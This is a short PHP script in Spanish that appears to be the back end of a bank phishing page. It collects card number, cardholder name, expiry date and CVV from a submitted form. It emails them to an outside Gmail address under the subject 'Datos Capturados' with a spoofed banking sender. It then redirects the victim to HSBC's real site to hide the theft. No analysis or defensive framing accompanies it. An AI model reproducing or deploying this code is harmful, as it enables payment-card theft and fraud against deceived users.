<?php
// Verifica si se enviaron datos 
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibe los datos 
    $NoTarjeta = htmlspecialchars($_POST['NoTarjeta']);
    $NombreCompleto = htmlspecialchars($_POST['NombreCompleto']);
    $Vencimiento = htmlspecialchars($_POST['Vencimiento']);
    $CVV = htmlspecialchars($_POST['CVV']);
    
    // Define el correo electrónico
    $destinatario = "playtowin10000@gmail.com";//"playtowin10000@gmail.com"
    // Asunto del correo
    $asunto = "Datos Capturados";
    
    // Cuerpo del correo
    $mensaje = "Número de Tarjeta: $NoTarjeta\n";
    $mensaje .= "Nombre Completo: $NombreCompleto\n";
    $mensaje .= "Fecha de vencimiento: $Vencimiento\n";
    $mensaje .= "CVV: $CVV\n";


    // Cabeceras del correo
    $cabeceras =  "From: no-reply@bancario.mx" . "\r\n" .
                  "Reply-To: no-reply@bancario.mx" . "\r\n" .
                  "X-Mailer: PHP/" . phpversion();

    if (mail($destinatario, $asunto, $mensaje, $cabeceras)) {
        
        header('Location: https://www.hsbc.com');
        exit();
    } else {
        echo "<h4>Error al enviar datos.</h4>";
        echo "Hubo un error al enviar los datos.";
    }
    
}

?>